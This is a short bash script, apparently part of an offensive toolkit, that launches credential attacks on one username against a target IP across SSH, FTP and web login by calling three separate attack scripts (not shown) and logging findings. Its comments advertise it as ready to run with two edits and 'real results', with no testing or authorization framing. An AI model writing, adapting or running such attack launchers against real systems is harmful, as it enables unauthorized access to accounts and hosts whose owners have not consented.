#!/bin/bash
# Single Username Attack - Just replace USERNAME and TARGET and run!
# Two-line change, fully functional, real results

# ====== CHANGE THESE LINES ======
USERNAME="admin"
TARGET="192.168.1.100"
# ================================

# Don't change anything below this line
cd "$(dirname "$0")/.."

echo "🎯 Starting Multi-Protocol Attack..."
echo "👤 Username: $USERNAME"
echo "🎯 Target: $TARGET"
echo ""

# Create temp username file
TEMP_USER=$(mktemp)
echo "$USERNAME" > "$TEMP_USER"

# Try SSH
echo "═══ Attempting SSH (port 22) ═══"
bash scripts/ssh_admin_attack.sh -t "$TARGET" -u "$TEMP_USER" -v
echo ""

# Try FTP
echo "═══ Attempting FTP (port 21) ═══"
bash scripts/ftp_admin_attack.sh -t "$TARGET" -u "$TEMP_USER" -v
echo ""

# Try Web
echo "═══ Attempting Web (port 80/443) ═══"
bash scripts/web_admin_attack.sh -t "$TARGET" -u "$TEMP_USER" -v
echo ""

# Cleanup
rm -f "$TEMP_USER"

echo "✅ Multi-protocol attack complete!"
echo "📊 Check logs/results_$(date +%Y%m%d).json for findings"
